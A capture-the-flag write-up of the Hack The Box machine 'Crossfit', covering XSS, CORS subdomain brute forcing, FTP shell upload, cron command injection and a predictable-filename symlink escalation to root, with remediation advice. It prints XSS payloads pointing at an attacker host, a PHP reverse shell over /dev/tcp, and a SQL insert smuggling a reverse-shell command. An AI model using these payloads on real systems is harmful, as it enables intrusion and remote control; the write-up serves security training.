---
title: "Crossfit HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T07:15:00Z
tags: ["insane-linux", "web", "xss", "cors", "ftp", "command-injection", "mysql", "privilege-escalation", "binary-exploitation", "symlink-attack"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Crossfit HTB machine featuring XSS exploitation, CORS bypass for subdomain enumeration, FTP shell uploads, command injection via vulnerable libraries, and privilege escalation through predictable binary exploitation"
---

# Crossfit HTB - Insane Linux Box Walkthrough

{{< youtube Z3Lj_YN0crc >}}

## Key Exploitation Steps and Techniques (Chronological Order)

Based on the transcript, the following outlines the main exploitation steps and techniques used to compromise the "Crossfit" machine on Hack The Box. I've focused on the core technical actions, omitting unrelated details like note-taking with Obsidian or tool installations (e.g., Flameshot). Steps are presented in the sequence they occurred in the walkthrough.

1. **Initial Reconnaissance (Nmap Scan)**
   - Performed a standard Nmap scan (`sudo nmap -sC -sV -oA nmap/crossfit [TARGET-IP]`) to identify open ports: 21 (FTP with SSL), 22 (SSH on Debian), and 80 (HTTP with Apache default page).
   - Grabbed SSL banner from FTP using OpenSSL (`openssl s_client -connect [TARGET-IP]:21 -starttls ftp`), revealing subdomains: stir.crossfit.htb and gymclub.crossfit.htb.
   - Added subdomains to `/etc/hosts` for virtual host resolution.

2. **Virtual Host Enumeration**
   - Accessed gymclub.crossfit.htb, which loaded a custom website (Apache default on main IP).
   - Ran Gobuster for virtual hosts (`gobuster vhost -u http://crossfit.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -v -o gobuster/vhost.out`), but no new hosts found initially.
   - Enumerated website for user inputs (contact forms on index.php, blog-single.php, contact.php) and potential usernames/emails from pages (e.g., Becky Taylor, Noah, Evelyn Fields, Leroy Guzman; emails like info@crossfit.htb).

3. **XSS Discovery and Initial Exploitation**
   - Tested contact forms for XSS by injecting payloads (e.g., `<script src="http://[ATTACKER-IP]/contact.php"></script>`) in fields like name, email, comment.
   - Forms detected XSS and generated security reports, but the report viewer page reflected the User-Agent header without sanitization.
   - Used Burp Suite Repeater to inject XSS in User-Agent (e.g., `<script src="http://[ATTACKER-IP]/useragent.php"></script>`), confirming execution via callback to attacker's HTTP server.
   - Chained XSS to load external JavaScript (e.g., document.location for cookie theft, but no cookies found).

4. **Subdomain Brute Force via CORS (Origin Header)**
   - Noticed CORS headers (Access-Control-Allow-Origin) validated subdomains on HTTP responses.
   - Switched to ffuf for brute force (`ffuf -u http://[TARGET-IP] -H "Origin: http://FUZZ.crossfit.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -mr "Access-Control-Allow-Origin" --ignore-body`), identifying ftp.crossfit.htb.
   - Added to `/etc/hosts`; page showed Apache default but confirmed via Origin header reflection.

5. **Internal Page Fetch via XSS (Proxying Requests)**
   - Used XSS to proxy requests via victim's browser with XMLHttpRequest in chained JS (e.g., fetch ftp.crossfit.htb, base64-encode response, send back to attacker).
   - Retrieved /accounts/create page, revealing username/password form with CSRF token.
   - Extended JS to parse CSRF token, POST to create account (username: ipsec, password: pleasesubscribe), bypassing CSRF.

6. **FTP Access and Shell Upload (www-data)**
   - Logged into FTP as created user (ipsec:pleasesubscribe) using lftp with SSL options.
   - Explored directories: /html (web root), /gymclub, /ftp (Laravel artifacts including .env with DB creds), /development-test (writable).
   - Uploaded PHP reverse shell (ip.php: `<?php system('bash -c "bash -i >& /dev/tcp/[ATTACKER-IP]/9001 0>&1"'); ?>`) to /development-test.
   - Added development-test.crossfit.htb to /etc/hosts; triggered shell via browser, gaining www-data access.

7. **Privilege Escalation to hank**
   - As www-data, ran LinPEAS for enumeration, finding hashes in files (e.g., SHA-512 for hank, bcrypt "password").
   - Cracked hank's hash (powerpuffgirls) using Hashcat (`hashcat -m 1800 hashes/crossfit_sha512 /opt/wordlists/rockyou.txt`).
   - SSH'd as hank (hank@[TARGET-IP]:powerpuffgirls).

8. **Command Injection via Cronjob (to isaac)**
   - As hank (member of admins group), inspected /send_updates.php cronjob (run by isaac every minute).
   - Script used vulnerable MyCartl Shell Command library (escapeArgs=true but ineffective; GitHub issue confirmed RCE).
   - Found FTP admin creds in configs (/etc/vsftpd.conf, pam.d/vsftpd).
   - Logged into FTP as ftp_adm, created file in /messages to trigger loop.
   - Connected to MySQL (crossfit DB creds from .env), inserted malicious email into users table (`INSERT INTO users (email) VALUES ('; bash -i >& /dev/tcp/[ATTACKER-IP]/9001 0>&1;');`).
   - Triggered cronjob, gaining isaac shell.

9. **Privilege Escalation to root (Binary Exploitation)**
   - As isaac (staff group), enumerated with LinPEAS/PSpy/find; found root-run binary /usr/bin/db_message (SUID? No, but cron'd).
   - Copied binary, reversed in Ghidra: Connects to MySQL (hardcoded creds), queries messages table, generates predictable filename in /var/local (time-seeded srand + MD5 of rand + message ID).
   - Wrote C program to predict rand (seed = time(NULL) - (time(NULL) % 60) + 61).
   - Inserted SSH pubkey into messages table columns (split across name/email/message to avoid spaces).
   - Predicted filename, symlinked /var/local/<predicted_md5> to /root/.ssh/authorized_keys (writable by staff).
   - Binary wrote key to symlink; SSH'd as root using corresponding private key.

## Security Gaps and Remediation

### HTTP/Web Server (Apache)
- **XSS in Contact Forms**: Forms detect basic XSS but fail to sanitize reflected inputs in security reports.
  *Source Code Fix*: Implement proper input sanitization (e.g., using HTML entities or libraries like DOMPurify) on all user-submitted fields, including name, email, and comments, before rendering in reports.
  *Configuration Fix*: Enable Content Security Policy (CSP) headers to restrict script sources.
- **XSS via User-Agent in Security Reports**: User-Agent header is reflected unsanitized in admin-viewed reports.
  *Source Code Fix*: Sanitize or escape the User-Agent string before displaying it (e.g., via htmlspecialchars in PHP).
  *Configuration Fix*: Use web application firewall (WAF) rules in Apache (e.g., mod_security) to filter malicious headers.
- **CORS Misconfiguration Allowing Subdomain Brute Force**: Origin header reflection enables enumeration of valid subdomains.
  *Source Code Fix*: Validate and restrict allowed origins in application logic before echoing in Access-Control-Allow-Origin.
  *Configuration Fix*: Set strict CORS policies in Apache config (e.g., `Header set Access-Control-Allow-Origin "https://gymclub.crossfit.htb"` only for trusted origins).
- **Virtual Host Routing Exposure**: Internal subdomains (e.g., ftp.crossfit.htb) accessible via proxied requests but not directly.
  *Configuration Fix*: Configure Apache virtual hosts to require authentication or IP restrictions for internal domains.

### FTP Server
- **Weak Account Creation via Proxied Internal Interface**: Accounts can be created via /accounts/create without proper access controls, exploitable via XSS proxying.
  *Source Code Fix*: Add CAPTCHA, rate limiting, or multi-factor checks to the account creation form; validate CSRF tokens strictly.
  *Configuration Fix*: Restrict FTP to specific IP ranges or require VPN access in vsftpd.conf.
- **Writable Directories Allowing Shell Uploads**: Directories like /development-test are writable, enabling PHP shell uploads.
  *Source Code Fix*: N/A (not code-based).
  *Configuration Fix*: Set stricter permissions in vsftpd.conf (e.g., `write_enable=NO` for non-essential users) and use chroot to jail users.
- **SSL Banner Leakage**: SSL certificate reveals internal subdomains and emails.
  *Source Code Fix*: N/A.
  *Configuration Fix*: Use self-signed or wildcard certificates without sensitive info; disable banner grabbing if possible.
- **Anonymous Login Enabled but Incorrectly Configured**: Allows attempts but fails; could lead to brute force if misconfigured.
  *Source Code Fix*: N/A.
  *Configuration Fix*: Explicitly disable anonymous access in vsftpd.conf (`anonymous_enable=NO`).

### SSH Server
- **Weak Password Hashing and Reuse**: Hank's SHA-512 hash cracked easily from file; potential for password reuse.
  *Source Code Fix*: N/A.
  *Configuration Fix*: Enforce stronger password policies in /etc/pam.d/sshd (e.g., via pam_pwquality) and use key-based auth only (`PasswordAuthentication no` in sshd_config).
- **Exposed User Enumeration**: Users like hank, isaac visible via logs and groups.
  *Source Code Fix*: N/A.
  *Configuration Fix*: Disable password auth and limit login attempts with fail2ban.

### MySQL Database
- **Hardcoded Credentials**: Credentials in .env and db_message binary.
  *Source Code Fix*: Use environment variables or secret managers (e.g., via PHP's getenv) instead of hardcoding.
  *Configuration Fix*: Rotate credentials regularly and restrict access in my.cnf (e.g., bind-address=127.0.0.1).
- **Unrestricted Insert Access**: Allows command injection or arbitrary data via users/messages tables.
  *Source Code Fix*: Use prepared statements with parameterized queries in PHP to prevent injection.
  *Configuration Fix*: Grant minimal privileges to application users (e.g., no INSERT on sensitive tables).
- **Exposed Database via FTP**: .env file with creds accessible in FTP directories.
  *Source Code Fix*: N/A.
  *Configuration Fix*: Exclude sensitive files from FTP access via vsftpd userlist or chroot.

### Cronjobs and PHP Scripts
- **Command Injection in send_updates.php**: Vulnerable MyCartl Shell Command library allows RCE despite escapeArgs=true.
  *Source Code Fix*: Update the library to a patched version or replace with secure exec functions (e.g., escapeshellarg + proc_open).
  *Configuration Fix*: Run cron as low-privilege user; add input validation filters.
- **Insecure File Processing Loop**: Processes files from /messages without validation, triggering injection.
  *Source Code Fix*: Sanitize database-fetched data (e.g., email) before passing to shell commands.
  *Configuration Fix*: Restrict directory permissions to prevent unauthorized file creation.
- **Outdated/Vulnerable Library Usage**: MyCartl library has known RCE issues.
  *Source Code Fix*: Audit and update dependencies (e.g., via Composer).
  *Configuration Fix*: N/A.

### Custom Binary (db_message)
- **Time-Seeded Random Number Generation**: Predictable rand() leads to filename collisions.
  *Source Code Fix*: Use cryptographically secure random (e.g., random_bytes or /dev/urandom instead of srand(time(NULL))).
  *Configuration Fix*: N/A.
- **Insecure File Writing to Predictable Path**: Writes to /var/local with group-writable perms, enabling symlink attacks.
  *Source Code Fix*: Use mkstemp for temporary files or absolute paths; drop privileges after root checks.
  *Configuration Fix*: Change /var/local permissions to root-only (chmod 700); run binary without root if possible.
- **Hardcoded Database Credentials**: Embedded in binary.
  *Source Code Fix*: Load creds from config files or env vars.
  *Configuration Fix*: Use separate config file with restricted perms.
- **Lack of Input Validation on Database Rows**: Processes messages table without sanitization.
  *Source Code Fix*: Validate and escape row data before processing.
  *Configuration Fix*: N/A.

### System-Wide Configurations
- **Process Hiding (hidepid=2)**: Hides PIDs but doesn't prevent enumeration via other means (e.g., PSpy).
  *Source Code Fix*: N/A.
  *Configuration Fix*: Strengthen with AppArmor/SELinux profiles to restrict process spying.
- **Overly Permissive Groups (admins, staff)**: Allows access to sensitive dirs/scripts.
  *Source Code Fix*: N/A.
  *Configuration Fix*: Audit /etc/group; remove unnecessary users and use sudoers for targeted access.
- **SUID/Privilege Issues**: Binary runs as root unnecessarily.
  *Source Code Fix*: Implement privilege dropping (e.g., setuid after init).
  *Configuration Fix*: Remove SUID bit if not needed; use capabilities instead.

## Conclusion

Crossfit is an excellent machine that demonstrates the complexity of modern web application security and the interconnected nature of system vulnerabilities. It requires expertise in:
- Advanced web application security and XSS exploitation
- CORS misconfiguration abuse and subdomain enumeration
- FTP service exploitation and file upload vulnerabilities
- Command injection through vulnerable third-party libraries
- Binary reverse engineering and predictable random number exploitation
- Symlink attacks and privilege escalation techniques

The machine emphasizes the importance of proper input validation, secure coding practices, regular dependency updates, and the principle of least privilege in system administration.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*